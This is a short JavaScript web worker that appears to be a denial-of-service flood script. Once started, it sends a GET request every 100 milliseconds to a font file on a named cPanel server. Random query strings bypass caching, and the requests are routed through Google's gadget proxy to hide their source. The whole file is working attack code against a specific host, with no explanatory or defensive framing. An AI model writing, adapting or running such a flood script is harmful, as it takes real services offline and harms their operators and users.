self.addEventListener('message', function(e) {

	if(e.data == "STOP")self.close();

	setInterval(function() {

		var target = 'https://server.enucuzanerede.com:2083/cPanel_magic_revision_1386192031/unprotected/cpanel/fonts/open_sans/OpenSans-Bold-webfont.woff?'+Math.random().toString(36).substr(2, 7)+'='+Math.floor(Math.random() * 99999999);

		var url = 'https://images1-focus-opensocial.googleusercontent.com/gadgets/proxy?url='+encodeURIComponent(target)+'&container=none';

		var xmlHttp = new XMLHttpRequest();

		xmlHttp.open("GET", url, true);

		xmlHttp.send(null);

	}, 100);

}, false);
